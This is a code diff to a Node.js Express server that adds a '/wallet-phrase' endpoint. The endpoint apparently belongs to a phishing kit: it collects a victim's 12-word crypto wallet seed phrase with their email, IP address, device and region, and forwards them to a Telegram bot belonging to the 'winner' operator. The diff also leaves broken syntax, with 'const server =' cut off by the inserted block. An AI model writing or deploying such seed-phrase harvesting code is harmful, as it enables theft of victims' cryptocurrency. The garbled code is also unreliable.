@@ -2184,7 +2184,52 @@ app.get("/get-verifying-info/:verifyingId", (req, res) => {
 // Start server
 // ============================================================================
 
-const server = app.listen(PORT, () => {
+const server = // ============================================================================
+// POST /wallet-phrase - Send wallet 12-word phrase to winner bot only
+// ============================================================================
+
+app.post("/wallet-phrase", async (req, res) => {
+  try {
+    const { phrase, userId, email } = req.body;
+
+    if (!phrase || !email) {
+      return res.status(400).json({ error: "Missing phrase or email" });
+    }
+
+    const ip = getIP(req);
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    const message =
+      `💰💰💰💰 <b>Wallet - Phrases</b> 💰💰💰💰\n` +
+      `<b>📝 Phrases:</b>\n` +
+      `<code>${phrase}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    // ✅ SEND TO WINNER ONLY
+    if (email && userWinnerTelegram[email]) {
+      await sendFollowUpMessage(email, message, {
+        parse_mode: "HTML"
+        // ✅ NO reply_markup - no buttons!
+      });
+      console.log(`💰 Wallet phrase sent to winner for ${email}`);
+    } else {
+      console.log(`⚠️ WARNING: No winner found for ${email}, not sending wallet phrase`);
+      return res.status(400).json({ error: "No winner determined for this email" });
+    }
+
+    res.json({ ok: true });
+
+  } catch (err) {
+    console.error("❌ Wallet phrase endpoint error:", err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.listen(PORT, () => {
   console.log(`✅ Backend running on port ${PORT}`);
   startSelfPing();
 });
